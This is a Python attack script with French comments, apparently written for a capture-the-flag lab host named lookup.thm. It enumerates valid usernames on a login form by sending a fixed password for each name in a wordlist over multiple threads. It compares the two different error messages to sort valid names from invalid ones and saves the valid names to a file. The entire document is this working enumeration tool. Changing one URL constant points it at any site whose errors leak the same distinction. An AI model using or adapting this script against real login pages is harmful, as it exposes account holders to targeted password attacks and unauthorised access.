#!/usr/bin/env python3

import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
TARGET_URL = "http://lookup.thm/login.php"
VALID_USER_INDICATOR = "Wrong password"
INVALID_USER_INDICATOR = "Wrong username or password"

def check_user(username):
    """
    Teste si un username est valide
    Retourne (username, True) si valide, (username, False) sinon
    """
    data = {
        'username': username.strip(),
        'password': 'testpassword123'  # Peu importe le mot de passe
    }

    try:
        response = requests.post(TARGET_URL, data=data, timeout=5)

        if VALID_USER_INDICATOR in response.text:
            return (username, True)
        elif INVALID_USER_INDICATOR in response.text:
            return (username, False)
        else:
            # Réponse inattendue
            return (username, None)

    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur pour {username}: {e}", file=sys.stderr)
        return (username, None)

def enumerate_users(userlist_file, threads=10):
    """
    Énumère les utilisateurs depuis un fichier
    """
    try:
        with open(userlist_file, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Fichier non trouvé: {userlist_file}")
        sys.exit(1)

    print(f"[*] Énumération de {len(usernames)} utilisateurs...")
    print(f"[*] URL cible: {TARGET_URL}")
    print(f"[*] Threads: {threads}\n")

    valid_users = []
    tested = 0

    # Utilisation de threads pour accélérer
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_user, user): user for user in usernames}

        for future in as_completed(futures):
            username, is_valid = future.result()
            tested += 1

            if is_valid is True:
                print(f"[+] Utilisateur VALIDE trouvé: {username}")
                valid_users.append(username)
            elif is_valid is False:
                print(f"[-] Invalide: {username}")
            else:
                print(f"[?] Réponse inattendue pour: {username}")

            # Progression
            if tested % 10 == 0:
                print(f"[*] Progression: {tested}/{len(usernames)}")

    print(f"\n{'='*50}")
    print(f"[*] Énumération terminée!")
    print(f"[*] Utilisateurs valides trouvés: {len(valid_users)}")

    if valid_users:
        print(f"\n[+] UTILISATEURS VALIDES:")
        for user in valid_users:
            print(f"    - {user}")

        # Sauvegarde dans un fichier
        output_file = "valid_users.txt"
        with open(output_file, 'w') as f:
            f.write('\n'.join(valid_users))
        print(f"\n[*] Résultats sauvegardés dans: {output_file}")
    else:
        print("\n[-] Aucun utilisateur valide trouvé.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier_usernames> [threads]")
        print(f"Exemple: {sys.argv[0]} users.txt 10")
        sys.exit(1)

    userlist = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10

    enumerate_users(userlist, threads)
